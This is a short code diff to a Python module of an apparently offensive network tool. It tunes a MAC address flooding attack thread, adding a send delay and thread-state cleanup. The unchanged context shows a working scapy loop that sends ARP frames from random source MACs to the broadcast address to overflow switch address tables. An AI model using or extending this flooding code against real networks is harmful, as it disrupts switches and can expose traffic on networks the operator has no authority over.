@@ -1,6 +1,7 @@
 from src.core import manager
 from src.cli import parser
 
+import time
 import threading
 from scapy.all import RandMAC, Ether, sendp, ARP, Padding
 
@@ -27,12 +28,15 @@ class MacAddressFloodingAttackThread(threading.Thread):
             while manager.attack_status == 'on' and manager.attack_type == 'mac_address_flooding':
                 randMAC = vendor + ':'.join(RandMAC().split(':')[3:])
                 sendp(Ether(src=randMAC ,dst="FF:FF:FF:FF:FF:FF") / ARP(op=2, psrc="0.0.0.0", hwdst="FF:FF:FF:FF:FF:FF") / Padding(load="X"*18),verbose=0)
+                time.sleep(0.01)
 
         except Exception as e:
+            manager.attack_thread = None
             manager.attack_status = f'error: {e}'
             manager.attack_type = ''
             return
         
+        manager.attack_thread = None
         manager.attack_status = 'off'
         manager.attack_type = ''
 
@@ -43,6 +47,7 @@ class MacAddressFloodingAttackThread(threading.Thread):
         elif manager.attack_status[:5] == 'error':
             return False
 
+        manager.attack_thread = None
         manager.attack_status = 'off'
         manager.attack_type = ''
 
